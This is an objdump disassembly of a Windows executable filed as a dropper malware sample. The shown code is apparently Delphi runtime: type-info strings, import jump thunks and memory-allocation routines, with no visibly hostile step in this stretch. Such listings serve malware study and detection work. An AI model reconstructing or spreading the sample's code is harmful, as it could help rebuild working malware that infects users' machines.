
malware_samples/dropper/a970cc51051fd6923b98acc862e68a201610d54638a6523d6a7b271ae9ec05bc.exe:     file format pei-i386


Disassembly of section CODE:

00401000 <CODE>:
  401000:	0a 06                	or     (%esi),%al
  401002:	73 74                	jae    0x401078
  401004:	72 69                	jb     0x40106f
  401006:	6e                   	outsb  %ds:(%esi),(%dx)
  401007:	67 00 00             	add    %al,(%bx,%si)
	...
  401016:	00 00                	add    %al,(%eax)
  401018:	3c 10                	cmp    $0x10,%al
  40101a:	40                   	inc    %eax
  40101b:	00 00                	add    %al,(%eax)
  40101d:	00 00                	add    %al,(%eax)
  40101f:	00 6d 11             	add    %ch,0x11(%ebp)
  401022:	40                   	inc    %eax
  401023:	00 04 00             	add    %al,(%eax,%eax,1)
  401026:	00 00                	add    %al,(%eax)
  401028:	00 00                	add    %al,(%eax)
  40102a:	00 00                	add    %al,(%eax)
  40102c:	c4 29                	les    (%ecx),%ebp
  40102e:	40                   	inc    %eax
  40102f:	00 ac 28 40 00 d4 28 	add    %ch,0x28d40040(%eax,%ebp,1)
  401036:	40                   	inc    %eax
  401037:	00 18                	add    %bl,(%eax)
  401039:	29 40 00             	sub    %eax,0x0(%eax)
  40103c:	11 00                	adc    %eax,(%eax)
  40103e:	0b 00                	or     (%eax),%eax
  401040:	24 29                	and    $0x29,%al
  401042:	40                   	inc    %eax
  401043:	00 04 46             	add    %al,(%esi,%eax,2)
  401046:	72 65                	jb     0x4010ad
  401048:	65 13 00             	adc    %gs:(%eax),%eax
  40104b:	30 29                	xor    %ch,(%ecx)
  40104d:	40                   	inc    %eax
  40104e:	00 0c 49             	add    %cl,(%ecx,%ecx,2)
  401051:	6e                   	outsb  %ds:(%esi),(%dx)
  401052:	69 74 49 6e 73 74 61 	imul   $0x6e617473,0x6e(%ecx,%ecx,2),%esi
  401059:	6e 
  40105a:	63 65 16             	arpl   %esp,0x16(%ebp)
  40105d:	00 4c 29 40          	add    %cl,0x40(%ecx,%ebp,1)
  401061:	00 0f                	add    %cl,(%edi)
  401063:	43                   	inc    %ebx
  401064:	6c                   	insb   (%dx),%es:(%edi)
  401065:	65 61                	gs popa
  401067:	6e                   	outsb  %ds:(%esi),(%dx)
  401068:	75 70                	jne    0x4010da
  40106a:	49                   	dec    %ecx
  40106b:	6e                   	outsb  %ds:(%esi),(%dx)
  40106c:	73 74                	jae    0x4010e2
  40106e:	61                   	popa
  40106f:	6e                   	outsb  %ds:(%esi),(%dx)
  401070:	63 65 10             	arpl   %esp,0x10(%ebp)
  401073:	00 68 28             	add    %ch,0x28(%eax)
  401076:	40                   	inc    %eax
  401077:	00 09                	add    %cl,(%ecx)
  401079:	43                   	inc    %ebx
  40107a:	6c                   	insb   (%dx),%es:(%edi)
  40107b:	61                   	popa
  40107c:	73 73                	jae    0x4010f1
  40107e:	54                   	push   %esp
  40107f:	79 70                	jns    0x4010f1
  401081:	65 10 00             	adc    %al,%gs:(%eax)
  401084:	6c                   	insb   (%dx),%es:(%edi)
  401085:	28 40 00             	sub    %al,0x0(%eax)
  401088:	09 43 6c             	or     %eax,0x6c(%ebx)
  40108b:	61                   	popa
  40108c:	73 73                	jae    0x401101
  40108e:	4e                   	dec    %esi
  40108f:	61                   	popa
  401090:	6d                   	insl   (%dx),%es:(%edi)
  401091:	65 12 00             	adc    %gs:(%eax),%al
  401094:	80 28 40             	subb   $0x40,(%eax)
  401097:	00 0b                	add    %cl,(%ebx)
  401099:	43                   	inc    %ebx
  40109a:	6c                   	insb   (%dx),%es:(%edi)
  40109b:	61                   	popa
  40109c:	73 73                	jae    0x401111
  40109e:	4e                   	dec    %esi
  40109f:	61                   	popa
  4010a0:	6d                   	insl   (%dx),%es:(%edi)
  4010a1:	65 49                	gs dec %ecx
  4010a3:	73 12                	jae    0x4010b7
  4010a5:	00 a8 28 40 00 0b    	add    %ch,0xb004028(%eax)
  4010ab:	43                   	inc    %ebx
  4010ac:	6c                   	insb   (%dx),%es:(%edi)
  4010ad:	61                   	popa
  4010ae:	73 73                	jae    0x401123
  4010b0:	50                   	push   %eax
  4010b1:	61                   	popa
  4010b2:	72 65                	jb     0x401119
  4010b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4010b5:	74 10                	je     0x4010c7
  4010b7:	00 c0                	add    %al,%al
  4010b9:	29 40 00             	sub    %eax,0x0(%eax)
  4010bc:	09 43 6c             	or     %eax,0x6c(%ebx)
  4010bf:	61                   	popa
  4010c0:	73 73                	jae    0x401135
  4010c2:	49                   	dec    %ecx
  4010c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4010c4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4010c6:	13 00                	adc    (%eax),%eax
  4010c8:	f8                   	clc
  4010c9:	28 40 00             	sub    %al,0x0(%eax)
  4010cc:	0c 49                	or     $0x49,%al
  4010ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4010cf:	73 74                	jae    0x401145
  4010d1:	61                   	popa
  4010d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4010d3:	63 65 53             	arpl   %esp,0x53(%ebp)
  4010d6:	69 7a 65 13 00 b0 29 	imul   $0x29b00013,0x65(%edx),%edi
  4010dd:	40                   	inc    %eax
  4010de:	00 0c 49             	add    %cl,(%ecx,%ecx,2)
  4010e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4010e2:	68 65 72 69 74       	push   $0x74697265
  4010e7:	73 46                	jae    0x40112f
  4010e9:	72 6f                	jb     0x40115a
  4010eb:	6d                   	insl   (%dx),%es:(%edi)
  4010ec:	0f 00 c8             	str    %eax
  4010ef:	29 40 00             	sub    %eax,0x0(%eax)
  4010f2:	08 44 69 73          	or     %al,0x73(%ecx,%ebp,2)
  4010f6:	70 61                	jo     0x401159
  4010f8:	74 63                	je     0x40115d
  4010fa:	68 14 00 f0 29       	push   $0x29f00014
  4010ff:	40                   	inc    %eax
  401100:	00 0d 4d 65 74 68    	add    %cl,0x6874654d
  401106:	6f                   	outsl  %ds:(%esi),(%dx)
  401107:	64 41                	fs inc %ecx
  401109:	64 64 72 65          	fs fs jb 0x401172
  40110d:	73 73                	jae    0x401182
  40110f:	11 00                	adc    %eax,(%eax)
  401111:	3c 2a                	cmp    $0x2a,%al
  401113:	40                   	inc    %eax
  401114:	00 0a                	add    %cl,(%edx)
  401116:	4d                   	dec    %ebp
  401117:	65 74 68             	gs je  0x401182
  40111a:	6f                   	outsl  %ds:(%esi),(%dx)
  40111b:	64 4e                	fs dec %esi
  40111d:	61                   	popa
  40111e:	6d                   	insl   (%dx),%es:(%edi)
  40111f:	65 13 00             	adc    %gs:(%eax),%eax
  401122:	78 2a                	js     0x40114e
  401124:	40                   	inc    %eax
  401125:	00 0c 46             	add    %cl,(%esi,%eax,2)
  401128:	69 65 6c 64 41 64 64 	imul   $0x64644164,0x6c(%ebp),%esp
  40112f:	72 65                	jb     0x401196
  401131:	73 73                	jae    0x4011a6
  401133:	15 00 c4 29 40       	adc    $0x4029c400,%eax
  401138:	00 0e                	add    %cl,(%esi)
  40113a:	44                   	inc    %esp
  40113b:	65 66 61             	gs popaw
  40113e:	75 6c                	jne    0x4011ac
  401140:	74 48                	je     0x40118a
  401142:	61                   	popa
  401143:	6e                   	outsb  %ds:(%esi),(%dx)
  401144:	64 6c                	fs insb (%dx),%es:(%edi)
  401146:	65 72 12             	gs jb  0x40115b
  401149:	00 ac 28 40 00 0b 4e 	add    %ch,0x4e0b0040(%eax,%ebp,1)
  401150:	65 77 49             	gs ja  0x40119c
  401153:	6e                   	outsb  %ds:(%esi),(%dx)
  401154:	73 74                	jae    0x4011ca
  401156:	61                   	popa
  401157:	6e                   	outsb  %ds:(%esi),(%dx)
  401158:	63 65 13             	arpl   %esp,0x13(%ebp)
  40115b:	00 d4                	add    %dl,%ah
  40115d:	28 40 00             	sub    %al,0x0(%eax)
  401160:	0c 46                	or     $0x46,%al
  401162:	72 65                	jb     0x4011c9
  401164:	65 49                	gs dec %ecx
  401166:	6e                   	outsb  %ds:(%esi),(%dx)
  401167:	73 74                	jae    0x4011dd
  401169:	61                   	popa
  40116a:	6e                   	outsb  %ds:(%esi),(%dx)
  40116b:	63 65 07             	arpl   %esp,0x7(%ebp)
  40116e:	54                   	push   %esp
  40116f:	4f                   	dec    %edi
  401170:	62 6a 65             	bound  %ebp,0x65(%edx)
  401173:	63 74 8d 40          	arpl   %esi,0x40(%ebp,%ecx,4)
  401177:	00 c3                	add    %al,%bl
  401179:	8d 40 00             	lea    0x0(%eax),%eax
  40117c:	ff 25 20 d1 40 00    	jmp    *0x40d120
  401182:	8b c0                	mov    %eax,%eax
  401184:	ff 25 1c d1 40 00    	jmp    *0x40d11c
  40118a:	8b c0                	mov    %eax,%eax
  40118c:	ff 25 18 d1 40 00    	jmp    *0x40d118
  401192:	8b c0                	mov    %eax,%eax
  401194:	ff 25 14 d1 40 00    	jmp    *0x40d114
  40119a:	8b c0                	mov    %eax,%eax
  40119c:	ff 25 10 d1 40 00    	jmp    *0x40d110
  4011a2:	8b c0                	mov    %eax,%eax
  4011a4:	ff 25 0c d1 40 00    	jmp    *0x40d10c
  4011aa:	8b c0                	mov    %eax,%eax
  4011ac:	ff 25 08 d1 40 00    	jmp    *0x40d108
  4011b2:	8b c0                	mov    %eax,%eax
  4011b4:	ff 25 28 d1 40 00    	jmp    *0x40d128
  4011ba:	8b c0                	mov    %eax,%eax
  4011bc:	ff 25 04 d1 40 00    	jmp    *0x40d104
  4011c2:	8b c0                	mov    %eax,%eax
  4011c4:	ff 25 00 d1 40 00    	jmp    *0x40d100
  4011ca:	8b c0                	mov    %eax,%eax
  4011cc:	ff 25 fc d0 40 00    	jmp    *0x40d0fc
  4011d2:	8b c0                	mov    %eax,%eax
  4011d4:	ff 25 f8 d0 40 00    	jmp    *0x40d0f8
  4011da:	8b c0                	mov    %eax,%eax
  4011dc:	ff 25 f4 d0 40 00    	jmp    *0x40d0f4
  4011e2:	8b c0                	mov    %eax,%eax
  4011e4:	ff 25 f0 d0 40 00    	jmp    *0x40d0f0
  4011ea:	8b c0                	mov    %eax,%eax
  4011ec:	ff 25 ec d0 40 00    	jmp    *0x40d0ec
  4011f2:	8b c0                	mov    %eax,%eax
  4011f4:	ff 25 e8 d0 40 00    	jmp    *0x40d0e8
  4011fa:	8b c0                	mov    %eax,%eax
  4011fc:	ff 25 e4 d0 40 00    	jmp    *0x40d0e4
  401202:	8b c0                	mov    %eax,%eax
  401204:	ff 25 e0 d0 40 00    	jmp    *0x40d0e0
  40120a:	8b c0                	mov    %eax,%eax
  40120c:	ff 25 dc d0 40 00    	jmp    *0x40d0dc
  401212:	8b c0                	mov    %eax,%eax
  401214:	ff 25 d8 d0 40 00    	jmp    *0x40d0d8
  40121a:	8b c0                	mov    %eax,%eax
  40121c:	ff 25 d4 d0 40 00    	jmp    *0x40d0d4
  401222:	8b c0                	mov    %eax,%eax
  401224:	ff 25 40 d1 40 00    	jmp    *0x40d140
  40122a:	8b c0                	mov    %eax,%eax
  40122c:	ff 25 3c d1 40 00    	jmp    *0x40d13c
  401232:	8b c0                	mov    %eax,%eax
  401234:	ff 25 38 d1 40 00    	jmp    *0x40d138
  40123a:	8b c0                	mov    %eax,%eax
  40123c:	ff 25 34 d1 40 00    	jmp    *0x40d134
  401242:	8b c0                	mov    %eax,%eax
  401244:	ff 25 30 d1 40 00    	jmp    *0x40d130
  40124a:	8b c0                	mov    %eax,%eax
  40124c:	ff 25 d0 d0 40 00    	jmp    *0x40d0d0
  401252:	8b c0                	mov    %eax,%eax
  401254:	ff 25 cc d0 40 00    	jmp    *0x40d0cc
  40125a:	8b c0                	mov    %eax,%eax
  40125c:	ff 25 c8 d0 40 00    	jmp    *0x40d0c8
  401262:	8b c0                	mov    %eax,%eax
  401264:	ff 25 c4 d0 40 00    	jmp    *0x40d0c4
  40126a:	8b c0                	mov    %eax,%eax
  40126c:	ff 25 c0 d0 40 00    	jmp    *0x40d0c0
  401272:	8b c0                	mov    %eax,%eax
  401274:	ff 25 bc d0 40 00    	jmp    *0x40d0bc
  40127a:	8b c0                	mov    %eax,%eax
  40127c:	ff 25 b8 d0 40 00    	jmp    *0x40d0b8
  401282:	8b c0                	mov    %eax,%eax
  401284:	ff 25 b4 d0 40 00    	jmp    *0x40d0b4
  40128a:	8b c0                	mov    %eax,%eax
  40128c:	53                   	push   %ebx
  40128d:	56                   	push   %esi
  40128e:	be 38 c4 40 00       	mov    $0x40c438,%esi
  401293:	83 3e 00             	cmpl   $0x0,(%esi)
  401296:	75 3a                	jne    0x4012d2
  401298:	68 44 06 00 00       	push   $0x644
  40129d:	6a 00                	push   $0x0
  40129f:	e8 a8 ff ff ff       	call   0x40124c
  4012a4:	8b c8                	mov    %eax,%ecx
  4012a6:	85 c9                	test   %ecx,%ecx
  4012a8:	75 05                	jne    0x4012af
  4012aa:	33 c0                	xor    %eax,%eax
  4012ac:	5e                   	pop    %esi
  4012ad:	5b                   	pop    %ebx
  4012ae:	c3                   	ret
  4012af:	a1 34 c4 40 00       	mov    0x40c434,%eax
  4012b4:	89 01                	mov    %eax,(%ecx)
  4012b6:	89 0d 34 c4 40 00    	mov    %ecx,0x40c434
  4012bc:	33 d2                	xor    %edx,%edx
  4012be:	8b c2                	mov    %edx,%eax
  4012c0:	03 c0                	add    %eax,%eax
  4012c2:	8d 44 c1 04          	lea    0x4(%ecx,%eax,8),%eax
  4012c6:	8b 1e                	mov    (%esi),%ebx
  4012c8:	89 18                	mov    %ebx,(%eax)
  4012ca:	89 06                	mov    %eax,(%esi)
  4012cc:	42                   	inc    %edx
  4012cd:	83 fa 64             	cmp    $0x64,%edx
  4012d0:	75 ec                	jne    0x4012be
  4012d2:	8b 06                	mov    (%esi),%eax
  4012d4:	8b 10                	mov    (%eax),%edx
  4012d6:	89 16                	mov    %edx,(%esi)
  4012d8:	5e                   	pop    %esi
  4012d9:	5b                   	pop    %ebx
  4012da:	c3                   	ret
  4012db:	90                   	nop
  4012dc:	89 00                	mov    %eax,(%eax)
  4012de:	89 40 04             	mov    %eax,0x4(%eax)
  4012e1:	c3                   	ret
  4012e2:	8b c0                	mov    %eax,%eax
  4012e4:	53                   	push   %ebx
  4012e5:	56                   	push   %esi
  4012e6:	8b f2                	mov    %edx,%esi
  4012e8:	8b d8                	mov    %eax,%ebx
  4012ea:	e8 9d ff ff ff       	call   0x40128c
  4012ef:	85 c0                	test   %eax,%eax
  4012f1:	75 05                	jne    0x4012f8
  4012f3:	33 c0                	xor    %eax,%eax
  4012f5:	5e                   	pop    %esi
  4012f6:	5b                   	pop    %ebx
  4012f7:	c3                   	ret
  4012f8:	8b 16                	mov    (%esi),%edx
  4012fa:	89 50 08             	mov    %edx,0x8(%eax)
  4012fd:	8b 56 04             	mov    0x4(%esi),%edx
  401300:	89 50 0c             	mov    %edx,0xc(%eax)
  401303:	8b 13                	mov    (%ebx),%edx
  401305:	89 10                	mov    %edx,(%eax)
  401307:	89 58 04             	mov    %ebx,0x4(%eax)
  40130a:	89 42 04             	mov    %eax,0x4(%edx)
  40130d:	89 03                	mov    %eax,(%ebx)
  40130f:	b0 01                	mov    $0x1,%al
  401311:	5e                   	pop    %esi
  401312:	5b                   	pop    %ebx
  401313:	c3                   	ret
  401314:	8b 50 04             	mov    0x4(%eax),%edx
  401317:	8b 08                	mov    (%eax),%ecx
  401319:	89 0a                	mov    %ecx,(%edx)
  40131b:	89 51 04             	mov    %edx,0x4(%ecx)
  40131e:	8b 15 38 c4 40 00    	mov    0x40c438,%edx
  401324:	89 10                	mov    %edx,(%eax)
  401326:	a3 38 c4 40 00       	mov    %eax,0x40c438
  40132b:	c3                   	ret
  40132c:	53                   	push   %ebx
  40132d:	56                   	push   %esi
  40132e:	57                   	push   %edi
  40132f:	55                   	push   %ebp
  401330:	51                   	push   %ecx
  401331:	8b f1                	mov    %ecx,%esi
  401333:	89 14 24             	mov    %edx,(%esp)
  401336:	8b e8                	mov    %eax,%ebp
  401338:	8b 5d 00             	mov    0x0(%ebp),%ebx
  40133b:	8b 04 24             	mov    (%esp),%eax
  40133e:	8b 10                	mov    (%eax),%edx
  401340:	89 16                	mov    %edx,(%esi)
  401342:	8b 50 04             	mov    0x4(%eax),%edx
  401345:	89 56 04             	mov    %edx,0x4(%esi)
  401348:	8b 3b                	mov    (%ebx),%edi
  40134a:	8b 43 08             	mov    0x8(%ebx),%eax
  40134d:	8b d0                	mov    %eax,%edx
  40134f:	03 53 0c             	add    0xc(%ebx),%edx
  401352:	3b 16                	cmp    (%esi),%edx
  401354:	75 14                	jne    0x40136a
  401356:	8b c3                	mov    %ebx,%eax
  401358:	e8 b7 ff ff ff       	call   0x401314
  40135d:	8b 43 08             	mov    0x8(%ebx),%eax
  401360:	89 06                	mov    %eax,(%esi)
  401362:	8b 43 0c             	mov    0xc(%ebx),%eax
  401365:	01 46 04             	add    %eax,0x4(%esi)
  401368:	eb 16                	jmp    0x401380
  40136a:	8b 16                	mov    (%esi),%edx
  40136c:	03 56 04             	add    0x4(%esi),%edx
  40136f:	3b c2                	cmp    %edx,%eax
  401371:	75 0d                	jne    0x401380
  401373:	8b c3                	mov    %ebx,%eax
  401375:	e8 9a ff ff ff       	call   0x401314
  40137a:	8b 43 0c             	mov    0xc(%ebx),%eax
  40137d:	01 46 04             	add    %eax,0x4(%esi)
  401380:	8b df                	mov    %edi,%ebx
  401382:	3b eb                	cmp    %ebx,%ebp
  401384:	75 c2                	jne    0x401348
  401386:	8b d6                	mov    %esi,%edx
  401388:	8b c5                	mov    %ebp,%eax
  40138a:	e8 55 ff ff ff       	call   0x4012e4
  40138f:	84 c0                	test   %al,%al
  401391:	75 04                	jne    0x401397
  401393:	33 c0                	xor    %eax,%eax
  401395:	89 06                	mov    %eax,(%esi)
  401397:	5a                   	pop    %edx
  401398:	5d                   	pop    %ebp
  401399:	5f                   	pop    %edi
  40139a:	5e                   	pop    %esi
  40139b:	5b                   	pop    %ebx
  40139c:	c3                   	ret
  40139d:	8d 40 00             	lea    0x0(%eax),%eax
  4013a0:	53                   	push   %ebx
  4013a1:	56                   	push   %esi
  4013a2:	57                   	push   %edi
  4013a3:	55                   	push   %ebp
  4013a4:	83 c4 f8             	add    $0xfffffff8,%esp
  4013a7:	8b d8                	mov    %eax,%ebx
  4013a9:	8b fb                	mov    %ebx,%edi
  4013ab:	8b 32                	mov    (%edx),%esi
  4013ad:	8b 43 08             	mov    0x8(%ebx),%eax
  4013b0:	3b f0                	cmp    %eax,%esi
  4013b2:	72 6c                	jb     0x401420
  4013b4:	8b ce                	mov    %esi,%ecx
  4013b6:	03 4a 04             	add    0x4(%edx),%ecx
  4013b9:	8b e8                	mov    %eax,%ebp
  4013bb:	03 6b 0c             	add    0xc(%ebx),%ebp
  4013be:	3b cd                	cmp    %ebp,%ecx
  4013c0:	77 5e                	ja     0x401420
  4013c2:	3b f0                	cmp    %eax,%esi
  4013c4:	75 1b                	jne    0x4013e1
  4013c6:	8b 42 04             	mov    0x4(%edx),%eax
  4013c9:	01 43 08             	add    %eax,0x8(%ebx)
  4013cc:	8b 42 04             	mov    0x4(%edx),%eax
  4013cf:	29 43 0c             	sub    %eax,0xc(%ebx)
  4013d2:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  4013d6:	75 44                	jne    0x40141c
  4013d8:	8b c3                	mov    %ebx,%eax
  4013da:	e8 35 ff ff ff       	call   0x401314
  4013df:	eb 3b                	jmp    0x40141c
  4013e1:	8b 0a                	mov    (%edx),%ecx
  4013e3:	8b 72 04             	mov    0x4(%edx),%esi
  4013e6:	03 ce                	add    %esi,%ecx
  4013e8:	8b f8                	mov    %eax,%edi
  4013ea:	03 7b 0c             	add    0xc(%ebx),%edi
  4013ed:	3b cf                	cmp    %edi,%ecx
  4013ef:	75 05                	jne    0x4013f6
  4013f1:	29 73 0c             	sub    %esi,0xc(%ebx)
  4013f4:	eb 26                	jmp    0x40141c
  4013f6:	8b 0a                	mov    (%edx),%ecx
  4013f8:	03 4a 04             	add    0x4(%edx),%ecx
  4013fb:	89 0c 24             	mov    %ecx,(%esp)
  4013fe:	2b f9                	sub    %ecx,%edi
  401400:	89 7c 24 04          	mov    %edi,0x4(%esp)
  401404:	8b 12                	mov    (%edx),%edx
  401406:	2b d0                	sub    %eax,%edx
  401408:	89 53 0c             	mov    %edx,0xc(%ebx)
  40140b:	8b d4                	mov    %esp,%edx
  40140d:	8b c3                	mov    %ebx,%eax
  40140f:	e8 d0 fe ff ff       	call   0x4012e4
  401414:	84 c0                	test   %al,%al
  401416:	75 04                	jne    0x40141c
  401418:	33 c0                	xor    %eax,%eax
  40141a:	eb 0c                	jmp    0x401428
  40141c:	b0 01                	mov    $0x1,%al
  40141e:	eb 08                	jmp    0x401428
  401420:	8b 1b                	mov    (%ebx),%ebx
  401422:	3b fb                	cmp    %ebx,%edi
  401424:	75 85                	jne    0x4013ab
  401426:	33 c0                	xor    %eax,%eax
  401428:	59                   	pop    %ecx
  401429:	5a                   	pop    %edx
  40142a:	5d                   	pop    %ebp
  40142b:	5f                   	pop    %edi
  40142c:	5e                   	pop    %esi
  40142d:	5b                   	pop    %ebx
  40142e:	c3                   	ret
  40142f:	90                   	nop
  401430:	53                   	push   %ebx
  401431:	56                   	push   %esi
  401432:	57                   	push   %edi
  401433:	8b da                	mov    %edx,%ebx
  401435:	8b f0                	mov    %eax,%esi
  401437:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  40143d:	7d 07                	jge    0x401446
  40143f:	be 00 00 10 00       	mov    $0x100000,%esi
  401444:	eb 0c                	jmp    0x401452
  401446:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  40144c:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  401452:	89 73 04             	mov    %esi,0x4(%ebx)
  401455:	6a 01                	push   $0x1
  401457:	68 00 20 00 00       	push   $0x2000
  40145c:	56                   	push   %esi
  40145d:	6a 00                	push   $0x0
  40145f:	e8 f8 fd ff ff       	call   0x40125c
  401464:	8b f8                	mov    %eax,%edi
  401466:	89 3b                	mov    %edi,(%ebx)
  401468:	85 ff                	test   %edi,%edi
  40146a:	74 23                	je     0x40148f
  40146c:	8b d3                	mov    %ebx,%edx
  40146e:	b8 3c c4 40 00       	mov    $0x40c43c,%eax
  401473:	e8 6c fe ff ff       	call   0x4012e4
  401478:	84 c0                	test   %al,%al
  40147a:	75 13                	jne    0x40148f
  40147c:	68 00 80 00 00       	push   $0x8000
  401481:	6a 00                	push   $0x0
  401483:	8b 03                	mov    (%ebx),%eax
  401485:	50                   	push   %eax
  401486:	e8 d9 fd ff ff       	call   0x401264
  40148b:	33 c0                	xor    %eax,%eax
  40148d:	89 03                	mov    %eax,(%ebx)
  40148f:	5f                   	pop    %edi
  401490:	5e                   	pop    %esi
  401491:	5b                   	pop    %ebx
  401492:	c3                   	ret
  401493:	90                   	nop
  401494:	53                   	push   %ebx
  401495:	56                   	push   %esi
  401496:	57                   	push   %edi
  401497:	55                   	push   %ebp
  401498:	8b d9                	mov    %ecx,%ebx
  40149a:	8b f2                	mov    %edx,%esi
  40149c:	8b e8                	mov    %eax,%ebp
  40149e:	c7 43 04 00 00 10 00 	movl   $0x100000,0x4(%ebx)
  4014a5:	6a 04                	push   $0x4
  4014a7:	68 00 20 00 00       	push   $0x2000
  4014ac:	68 00 00 10 00       	push   $0x100000
  4014b1:	55                   	push   %ebp
  4014b2:	e8 a5 fd ff ff       	call   0x40125c
  4014b7:	8b f8                	mov    %eax,%edi
  4014b9:	89 3b                	mov    %edi,(%ebx)
  4014bb:	85 ff                	test   %edi,%edi
  4014bd:	75 1f                	jne    0x4014de
  4014bf:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  4014c5:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  4014cb:	89 73 04             	mov    %esi,0x4(%ebx)
  4014ce:	6a 04                	push   $0x4
  4014d0:	68 00 20 00 00       	push   $0x2000
  4014d5:	56                   	push   %esi
  4014d6:	55                   	push   %ebp
  4014d7:	e8 80 fd ff ff       	call   0x40125c
  4014dc:	89 03                	mov    %eax,(%ebx)
  4014de:	83 3b 00             	cmpl   $0x0,(%ebx)
  4014e1:	74 23                	je     0x401506
  4014e3:	8b d3                	mov    %ebx,%edx
  4014e5:	b8 3c c4 40 00       	mov    $0x40c43c,%eax
  4014ea:	e8 f5 fd ff ff       	call   0x4012e4
  4014ef:	84 c0                	test   %al,%al
  4014f1:	75 13                	jne    0x401506
  4014f3:	68 00 80 00 00       	push   $0x8000
  4014f8:	6a 00                	push   $0x0
  4014fa:	8b 03                	mov    (%ebx),%eax
  4014fc:	50                   	push   %eax
  4014fd:	e8 62 fd ff ff       	call   0x401264
  401502:	33 c0                	xor    %eax,%eax
  401504:	89 03                	mov    %eax,(%ebx)
  401506:	5d                   	pop    %ebp
  401507:	5f                   	pop    %edi
  401508:	5e                   	pop    %esi
  401509:	5b                   	pop    %ebx
  40150a:	c3                   	ret
  40150b:	90                   	nop
  40150c:	53                   	push   %ebx
  40150d:	56                   	push   %esi
  40150e:	57                   	push   %edi
  40150f:	55                   	push   %ebp
  401510:	83 c4 ec             	add    $0xffffffec,%esp
  401513:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  401517:	89 14 24             	mov    %edx,(%esp)
  40151a:	c7 44 24 08 ff ff ff 	movl   $0xffffffff,0x8(%esp)
  401521:	ff 
  401522:	33 d2                	xor    %edx,%edx
  401524:	89 54 24 0c          	mov    %edx,0xc(%esp)
  401528:	8b e8                	mov    %eax,%ebp
  40152a:	8b 04 24             	mov    (%esp),%eax
  40152d:	03 c5                	add    %ebp,%eax
  40152f:	89 44 24 10          	mov    %eax,0x10(%esp)
  401533:	8b 1d 3c c4 40 00    	mov    0x40c43c,%ebx
  401539:	eb 51                	jmp    0x40158c
  40153b:	8b 3b                	mov    (%ebx),%edi
  40153d:	8b 73 08             	mov    0x8(%ebx),%esi
  401540:	3b ee                	cmp    %esi,%ebp
  401542:	77 46                	ja     0x40158a
  401544:	8b c6                	mov    %esi,%eax
  401546:	03 43 0c             	add    0xc(%ebx),%eax
  401549:	3b 44 24 10          	cmp    0x10(%esp),%eax
  40154d:	77 3b                	ja     0x40158a
  40154f:	3b 74 24 08          	cmp    0x8(%esp),%esi
  401553:	73 04                	jae    0x401559
  401555:	89 74 24 08          	mov    %esi,0x8(%esp)
  401559:	8b c6                	mov    %esi,%eax
  40155b:	03 43 0c             	add    0xc(%ebx),%eax
  40155e:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  401562:	76 04                	jbe    0x401568
  401564:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401568:	68 00 80 00 00       	push   $0x8000
  40156d:	6a 00                	push   $0x0
  40156f:	56                   	push   %esi
  401570:	e8 ef fc ff ff       	call   0x401264
  401575:	85 c0                	test   %eax,%eax
  401577:	75 0a                	jne    0x401583
  401579:	c7 05 18 c4 40 00 01 	movl   $0x1,0x40c418
  401580:	00 00 00 
  401583:	8b c3                	mov    %ebx,%eax
  401585:	e8 8a fd ff ff       	call   0x401314
  40158a:	8b df                	mov    %edi,%ebx
  40158c:	81 fb 3c c4 40 00    	cmp    $0x40c43c,%ebx
  401592:	75 a7                	jne    0x40153b
  401594:	8b 44 24 04          	mov    0x4(%esp),%eax
  401598:	33 d2                	xor    %edx,%edx
  40159a:	89 10                	mov    %edx,(%eax)
  40159c:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4015a1:	74 19                	je     0x4015bc
  4015a3:	8b 44 24 04          	mov    0x4(%esp),%eax
  4015a7:	8b 54 24 08          	mov    0x8(%esp),%edx
  4015ab:	89 10                	mov    %edx,(%eax)
  4015ad:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4015b1:	2b 44 24 08          	sub    0x8(%esp),%eax
  4015b5:	8b 54 24 04          	mov    0x4(%esp),%edx
  4015b9:	89 42 04             	mov    %eax,0x4(%edx)
  4015bc:	83 c4 14             	add    $0x14,%esp
  4015bf:	5d                   	pop    %ebp
  4015c0:	5f                   	pop    %edi
  4015c1:	5e                   	pop    %esi
  4015c2:	5b                   	pop    %ebx
  4015c3:	c3                   	ret
  4015c4:	53                   	push   %ebx
  4015c5:	56                   	push   %esi
  4015c6:	57                   	push   %edi
  4015c7:	55                   	push   %ebp
  4015c8:	83 c4 f4             	add    $0xfffffff4,%esp
  4015cb:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  4015cf:	89 14 24             	mov    %edx,(%esp)
  4015d2:	8b d0                	mov    %eax,%edx
  4015d4:	8b ea                	mov    %edx,%ebp
  4015d6:	81 e5 00 f0 ff ff    	and    $0xfffff000,%ebp
  4015dc:	03 14 24             	add    (%esp),%edx
  4015df:	81 c2 ff 0f 00 00    	add    $0xfff,%edx
  4015e5:	81 e2 00 f0 ff ff    	and    $0xfffff000,%edx
  4015eb:	89 54 24 08          	mov    %edx,0x8(%esp)
  4015ef:	8b 44 24 04          	mov    0x4(%esp),%eax
  4015f3:	89 28                	mov    %ebp,(%eax)
  4015f5:	8b 44 24 08          	mov    0x8(%esp),%eax
  4015f9:	2b c5                	sub    %ebp,%eax
  4015fb:	8b 54 24 04          	mov    0x4(%esp),%edx
  4015ff:	89 42 04             	mov    %eax,0x4(%edx)
  401602:	8b 35 3c c4 40 00    	mov    0x40c43c,%esi
  401608:	eb 3c                	jmp    0x401646
  40160a:	8b 5e 08             	mov    0x8(%esi),%ebx
  40160d:	8b 7e 0c             	mov    0xc(%esi),%edi
  401610:	03 fb                	add    %ebx,%edi
  401612:	3b eb                	cmp    %ebx,%ebp
  401614:	76 02                	jbe    0x401618
  401616:	8b dd                	mov    %ebp,%ebx
  401618:	3b 7c 24 08          	cmp    0x8(%esp),%edi
